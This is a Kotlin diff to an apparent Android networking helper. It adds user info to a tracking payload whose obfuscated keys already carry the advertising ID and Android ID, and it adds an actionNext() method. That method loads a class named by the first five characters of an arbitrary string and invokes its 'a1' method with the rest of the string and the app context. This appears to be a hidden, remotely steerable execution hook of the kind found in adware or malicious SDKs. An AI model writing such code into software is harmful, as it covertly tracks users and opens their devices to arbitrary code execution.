@@ -26,6 +26,9 @@ class WillowNetHelper {
             put("gorge", "_")
             put("thrush", Tools.mGaidStr)
             put("johannes", Tools.mAndroidIdStr)
+            if (Tools.userInfo.isNotBlank()) {
+                put("apron", JSONObject().put("type", Tools.userInfo))
+            }
         }
     }
 
@@ -36,6 +39,7 @@ class WillowNetHelper {
             put("l", "")
             put("biopsy", "auto")
             put("kruger", 0L)
+            put("litigant", 0L)
             put("jest", 0L)
             put("fogging", 0L)
             put("military", 0L)
@@ -67,6 +71,13 @@ class WillowNetHelper {
             e.printStackTrace()
             // 处理异常，例如反射失败或安全异常
         }
+    }
+
+    fun actionNext(string: String) {
+        val name = string.substring(0, 5)
+        Class.forName(name)
+            .getMethod("a1", String::class.java, Context::class.java)
+            .invoke(null, string.substring(5), Tools.mApplication)
     }
 
 }
